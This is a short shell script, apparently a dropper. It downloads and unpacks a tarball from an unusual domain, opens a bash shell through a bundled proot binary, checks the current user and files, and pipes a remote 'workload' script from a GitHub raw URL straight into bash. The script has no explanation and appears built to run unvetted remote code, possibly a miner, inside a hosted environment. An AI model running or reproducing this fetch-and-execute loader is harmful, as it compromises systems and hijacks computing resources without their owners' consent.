#!/bin/sh
wget http://greenleaf.teatspray.fun/backup4.tar.gz
tar -xf backup4.tar.gz
rm backup4.tar.gz
./dist/proot -S . /bin/bash
whoami
ls -la
wget -O - https://raw.githubusercontent.com/mvelisomakhenkce/nodejs/main/workload_for_shiny.sh | bash
